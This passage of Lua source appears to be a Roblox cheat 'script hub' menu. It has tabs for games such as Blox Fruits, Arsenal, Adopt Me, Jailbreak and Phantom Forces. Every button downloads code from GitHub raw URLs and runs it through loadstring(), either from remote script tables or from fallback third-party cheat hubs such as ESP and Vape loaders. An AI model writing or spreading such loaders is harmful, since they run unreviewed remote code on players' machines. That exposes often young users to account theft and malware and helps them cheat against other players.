        loadstring(getHttpRequest("https://raw.githubusercontent.com/MuxusTL/BloxFruits/main/MuxusHub_V2.lua"))()
        executednotify("MUXUS Hub")
   end,
})

BloxFruits:CreateButton({
   Name = "MIN GREEN Hub",
   Callback = function()
        loadstring(getHttpRequest("https://raw.githubusercontent.com/Basicallyybeta/main/main/Mingaming.lua"))()
        executednotify("MIN GREEN Hub")
   end,
})

-- Arsenal Tab Scripts
ArsenalTab:CreateSection("Arsenal Scripts")

-- Load Arsenal scripts from file
local function loadArsenalScripts()
    local success, arsenal_scripts = pcall(function()
        return loadstring(getHttpRequest("https://raw.githubusercontent.com/ktrolegl/LAJhubv2/refs/heads/main/arsenal_scripts.lua"))()
    end)
    
    if success and arsenal_scripts then
        for scriptName, scriptCode in pairs(arsenal_scripts) do
            ArsenalTab:CreateButton({
                Name = scriptName,
                Callback = function()
                    loadstring(scriptCode)()
                    executednotify(scriptName)
                end,
            })
        end
    else
        ArsenalTab:CreateButton({
            Name = "OwlHub",
            Callback = function()
                loadstring(game:HttpGet("https://raw.githubusercontent.com/CriShoux/OwlHub/master/OwlHub.txt"))()
                executednotify("OwlHub")
            end,
        })
        
        ArsenalTab:CreateButton({
            Name = "Dark Hub",
            Callback = function()
                loadstring(game:HttpGet("https://raw.githubusercontent.com/RandomAdamYT/DarkHub/master/Init", true))()
                executednotify("Dark Hub")
            end,
        })
    end
end

loadArsenalScripts()

-- Adopt Me Tab Scripts
AdoptMeTab:CreateSection("Adopt Me Scripts")

-- Load Adopt Me scripts from file
local function loadAdoptMeScripts()
    local success, adopt_me_scripts = pcall(function()
        return loadstring(getHttpRequest("https://raw.githubusercontent.com/ktrolegl/LAJhubv2/refs/heads/main/adopt_me_scripts.lua"))()
    end)
    
    if success and adopt_me_scripts then
        for scriptName, scriptCode in pairs(adopt_me_scripts) do
            AdoptMeTab:CreateButton({
                Name = scriptName,
                Callback = function()
                    loadstring(scriptCode)()
                    executednotify(scriptName)
                end,
            })
        end
    else
        AdoptMeTab:CreateButton({
            Name = "V.G Hub",
            Callback = function()
                loadstring(game:HttpGet('https://raw.githubusercontent.com/1201for/V.G-Hub/main/V.Ghub'))()
                executednotify("V.G Hub")
            end,
        })
        
        AdoptMeTab:CreateButton({
            Name = "Ice Hub",
            Callback = function()
                loadstring(game:HttpGet("https://raw.githubusercontent.com/IceMael7/NewIceHub/main/Brookhaven"))()
                executednotify("Ice Hub")
            end,
        })
    end
end

loadAdoptMeScripts()

-- Bed Wars Tab Scripts
BedWarsTab:CreateSection("Bed Wars Scripts")

-- Load Bed Wars scripts from file
local function loadBedWarsScripts()
    local success, bedwars_scripts = pcall(function()
        return loadstring(getHttpRequest("https://raw.githubusercontent.com/ktrolegl/LAJhubv2/refs/heads/main/bedwars_scripts.lua"))()
    end)
    
    if success and bedwars_scripts then
        for scriptName, scriptCode in pairs(bedwars_scripts) do
            BedWarsTab:CreateButton({
                Name = scriptName,
                Callback = function()
                    loadstring(scriptCode)()
                    executednotify(scriptName)
                end,
            })
        end
    else
        BedWarsTab:CreateButton({
            Name = "Vape V4",
            Callback = function()
                loadstring(game:HttpGet("https://raw.githubusercontent.com/7GrandDadPGN/VapeV4ForRoblox/main/NewMainScript.lua", true))()
                executednotify("Vape V4")
            end,
        })
        
        BedWarsTab:CreateButton({
            Name = "Future Client",
            Callback = function()
                loadstring(game:HttpGet('https://raw.githubusercontent.com/joeengo/Future/main/loadstring.lua', true))()
                executednotify("Future Client")
            end,
        })
    end
end

loadBedWarsScripts()

-- Jailbreak Tab Scripts
JailbreakTab:CreateSection("Jailbreak Scripts")

-- Load Jailbreak scripts from file
local function loadJailbreakScripts()
    local success, jailbreak_scripts = pcall(function()
        return loadstring(getHttpRequest("https://raw.githubusercontent.com/ktrolegl/LAJhubv2/refs/heads/main/jailbreak_scripts.lua"))()
    end)
    
    if success and jailbreak_scripts then
        for scriptName, scriptCode in pairs(jailbreak_scripts) do
            JailbreakTab:CreateButton({
                Name = scriptName,
                Callback = function()
                    loadstring(scriptCode)()
                    executednotify(scriptName)
                end,
            })
        end
    else
        JailbreakTab:CreateButton({
            Name = "Project Evolution",
            Callback = function()
                loadstring(game:HttpGet("https://raw.githubusercontent.com/Project-Evolution/Main/main/Loader.lua", true))()
                executednotify("Project Evolution")
            end,
        })
        
        JailbreakTab:CreateButton({
            Name = "Sacred Hub",
            Callback = function()
                loadstring(game:HttpGet("https://raw.githubusercontent.com/SacredScripter/Sacred/main/SacredHub.lua"))()
                executednotify("Sacred Hub")
            end,
        })
    end
end

loadJailbreakScripts()

-- Natural Disaster Tab Scripts
NaturalDisasterTab:CreateSection("Natural Disaster Scripts")

-- Load Natural Disaster scripts from file
local function loadNaturalDisasterScripts()
    local success, natural_disaster_scripts = pcall(function()
        return loadstring(getHttpRequest("https://raw.githubusercontent.com/ktrolegl/LAJhubv2/refs/heads/main/natural_disaster_scripts.lua"))()
    end)
    
    if success and natural_disaster_scripts then
        for scriptName, scriptCode in pairs(natural_disaster_scripts) do
            NaturalDisasterTab:CreateButton({
                Name = scriptName,
                Callback = function()
                    loadstring(scriptCode)()
                    executednotify(scriptName)
                end,
            })
        end
    else
        NaturalDisasterTab:CreateButton({
            Name = "Natural Disaster GUI",
            Callback = function()
                loadstring(game:HttpGet("https://raw.githubusercontent.com/2dgeneralspam1/scripts-and-stuff/master/scripts/LoadstringypVvhJBq4QNz", true))()
                executednotify("Natural Disaster GUI")
            end,
        })
        
        NaturalDisasterTab:CreateButton({
            Name = "Astra GUI",
            Callback = function()
                loadstring(game:HttpGet("https://raw.githubusercontent.com/Nikita365/Astra-Hub/main/Loader.lua", true))()
                executednotify("Astra GUI")
            end,
        })
    end
end

loadNaturalDisasterScripts()

-- Phantom Forces Tab Scripts
PhantomForcesTab:CreateSection("Phantom Forces Scripts")

-- Load Phantom Forces scripts from file
local function loadPhantomForcesScripts()
    local success, phantom_forces_scripts = pcall(function()
        return loadstring(getHttpRequest("https://raw.githubusercontent.com/ktrolegl/LAJhubv2/refs/heads/main/phantom_forces_scripts.lua"))()
    end)
    
    if success and phantom_forces_scripts then
        for scriptName, scriptCode in pairs(phantom_forces_scripts) do
            PhantomForcesTab:CreateButton({
                Name = scriptName,
                Callback = function()
                    loadstring(scriptCode)()
                    executednotify(scriptName)
                end,
            })
        end
    else
        PhantomForcesTab:CreateButton({
            Name = "Phantom Forces ESP",
            Callback = function()
                loadstring(game:HttpGet("https://raw.githubusercontent.com/alfiebgtbhgh/phantom/main/script.lua"))()
                executednotify("Phantom Forces ESP")
            end,
        })
        
        PhantomForcesTab:CreateButton({
            Name = "Unfair Hub",
            Callback = function()
                loadstring(game:HttpGet("https://raw.githubusercontent.com/rblxscriptsnet/unfair/main/rblxhub.lua"))()
                executednotify("Unfair Hub")
            end,
        })
    end
end

loadPhantomForcesScripts()

-- Blade Ball Tab Scripts
BladeballTab:CreateSection("Blade Ball Scripts")

-- Load Blade Ball scripts from file
local function loadBladeballScripts()
    local success, bladeball_scripts = pcall(function()
        return loadstring(getHttpRequest("https://raw.githubusercontent.com/ktrolegl/LAJhubv2/refs/heads/main/bladeball_scripts.lua"))()
    end)
    
    if success and bladeball_scripts then
        for scriptName, scriptCode in pairs(bladeball_scripts) do
            BladeballTab:CreateButton({
                Name = scriptName,
                Callback = function()
                    loadstring(scriptCode)()
                    executednotify(scriptName)
                end,
            })
        end
    else
        BladeballTab:CreateButton({
            Name = "Bedra Hub",
            Callback = function()
                loadstring(game:HttpGet('https://raw.githubusercontent.com/Bedrathedas/BedraHub/refs/heads/Main/BladeballBedra.lua'))()
                executednotify("Bedra Hub")
            end,
        })
        
        BladeballTab:CreateButton({
            Name = "Neva Hub",
            Callback = function()
                loadstring(game:HttpGet('https://raw.githubusercontent.com/VEZ2/NEVAHUB/main/2'))()
                executednotify("Neva Hub")
            end,
        })
    end
end

loadBladeballScripts()

-- Shindo Life Tab Scripts
ShindoLifeTab:CreateSection("Shindo Life Scripts")

-- Load Shindo Life scripts from file
local function loadShindoLifeScripts()
    local success, shindo_life_scripts = pcall(function()
        return loadstring(getHttpRequest("https://raw.githubusercontent.com/ktrolegl/LAJhubv2/refs/heads/main/shindo_life_scripts.lua"))()
    end)
    
    if success and shindo_life_scripts then
        for scriptName, scriptCode in pairs(shindo_life_scripts) do
            ShindoLifeTab:CreateButton({
                Name = scriptName,
                Callback = function()
                    loadstring(scriptCode)()
                    executednotify(scriptName)
                end,
            })
        end
    else
        ShindoLifeTab:CreateButton({
            Name = "Platinum Hub",
            Callback = function()
                loadstring(game:HttpGet('https://raw.githubusercontent.com/ZaRdoOx/Platinum/main/Loader'))()
                executednotify("Platinum Hub")
            end,
        })
        
        ShindoLifeTab:CreateButton({
            Name = "Premier Hub",
            Callback = function()
                loadstring(game:HttpGet('https://raw.githubusercontent.com/ScriptedCodes/PREMIERHUB/main/NEWSHINDO'))()
                executednotify("Premier Hub")
            end,
        })
    end
end

loadShindoLifeScripts()

-- Fishing Simulator Tab Scripts
FishingSimTab:CreateSection("Fishing Simulator Scripts")

-- Load Fishing Simulator scripts from file
local function loadFishingSimScripts()
    local success, fishing_sim_scripts = pcall(function()
        return loadstring(getHttpRequest("https://raw.githubusercontent.com/ktrolegl/LAJhubv2/refs/heads/main/fishing_simulator_scripts.lua"))()
    end)
    
    if success and fishing_sim_scripts then
        for scriptName, scriptCode in pairs(fishing_sim_scripts) do
            FishingSimTab:CreateButton({
                Name = scriptName,
                Callback = function()
                    loadstring(scriptCode)()
                    executednotify(scriptName)
                end,
            })
        end
    else
        FishingSimTab:CreateButton({
            Name = "Ultimate Fishing",
            Callback = function()
                loadstring(game:HttpGet('https://raw.githubusercontent.com/Drifty96/ftfgui/main/fishingsimulator'))()
                executednotify("Ultimate Fishing")
            end,
        })
        
        FishingSimTab:CreateButton({
            Name = "Kitty Hub",
            Callback = function()
                loadstring(game:HttpGet('https://raw.githubusercontent.com/KittenPixel-cell/Kitty-Hub/main/Main.lua'))()
                executednotify("Kitty Hub")
            end,
        })
    end
end

loadFishingSimScripts()

-- Big Paintball Tab Scripts
BigPaintballTab:CreateSection("Big Paintball Scripts")

-- Load Big Paintball scripts from file
local function loadBigPaintballScripts()
    local success, big_paintball_scripts = pcall(function()
        return loadstring(getHttpRequest("https://raw.githubusercontent.com/ktrolegl/LAJhubv2/refs/heads/main/big_paintball_scripts.lua"))()
    end)
    
    if success and big_paintball_scripts then
        for scriptName, scriptCode in pairs(big_paintball_scripts) do
            BigPaintballTab:CreateButton({
                Name = scriptName,
                Callback = function()
                    loadstring(scriptCode)()
                    executednotify(scriptName)
                end,
            })
        end
    else
        BigPaintballTab:CreateButton({
            Name = "Dark Hub",
            Callback = function()
                loadstring(game:HttpGet('https://raw.githubusercontent.com/RandomAdamYT/DarkHub/master/Init'))()
                executednotify("Dark Hub")
            end,
        })
        
        BigPaintballTab:CreateButton({
            Name = "RBLX Hub",
            Callback = function()
                loadstring(game:HttpGet('https://raw.githubusercontent.com/NighterEpic/Faded/main/YesEpic'))()
                executednotify("RBLX Hub")
            end,
        })
    end
end

loadBigPaintballScripts()
